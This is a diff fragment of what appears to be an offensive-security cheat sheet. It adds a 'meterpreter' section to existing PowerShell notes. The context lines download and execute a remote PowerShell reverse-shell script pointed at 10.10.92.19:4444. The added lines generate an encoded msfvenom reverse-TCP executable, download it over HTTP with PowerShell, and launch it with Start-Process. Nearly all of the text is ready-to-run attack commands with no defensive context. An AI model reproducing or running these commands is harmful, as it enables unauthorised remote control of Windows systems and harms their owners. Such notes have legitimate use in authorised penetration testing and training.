@@ -19,6 +19,19 @@ powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadStrin
 
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.92.19:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.92.19 -Port 4444
 
+## meterpreter 
+
+Generate
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
+
+Download
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
+  
+Start 
+Start-Process "shell-name.exe"
+  
+  
 
 # Privilege elevation
 
